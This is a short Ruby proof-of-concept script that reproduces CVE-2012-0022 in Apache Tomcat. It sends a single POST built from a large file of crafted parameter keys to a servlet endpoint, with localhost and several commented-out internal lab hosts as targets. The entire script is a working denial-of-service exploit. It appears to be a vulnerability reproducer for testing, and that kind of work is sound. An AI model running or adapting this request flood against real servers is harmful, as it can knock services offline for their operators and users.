# CVE-2012-0022 reproducer, based on CVE-2011-4858 reproducer
#!/usr/bin/env ruby

require 'rubygems'
require 'pp'
require 'net/http'
require 'uri'

# this needs to be something that accepts POST request
TARGET_URL = 'http://127.0.0.1:8080/examples/servlets/servlet/RequestParamExample'
#TARGET_URL = 'http://localhost:8080/servlets-examples/servlet/RequestParamExample'
#TARGET_URL = 'http://djorm-rhel56.cloud.lab.eng.bne.redhat.com:8080/examples/servlets/servlet/RequestParamExample'
#TARGET_URL = 'http://djorm-rhel61.cloud.lab.eng.bne.redhat.com:8080/servlets-examples/servlet/RequestParamExample'
#TARGET_URL = 'http://djorm-rhel61-ews.cloud.lab.eng.bne.redhat.com:8080/examples/servlets/servlet/RequestParamExample'
#TARGET_URL = 'http://djorm-rhel56-ews.cloud.lab.eng.bne.redhat.com:8080/servlets-examples/servlet/RequestParamExample'
#TARGET_URL = 'http://djorm-rhel56-ews.cloud.lab.eng.bne.redhat.com:8080/examples/servlets/servlet/RequestParamExample'

post_string = File.read('keys_not_mapping_2m').gsub("\n", '&')

url = URI.parse(TARGET_URL)
res = Net::HTTP.start(url.host, url.port) do |http|
	http.post(url.path, post_string)
end
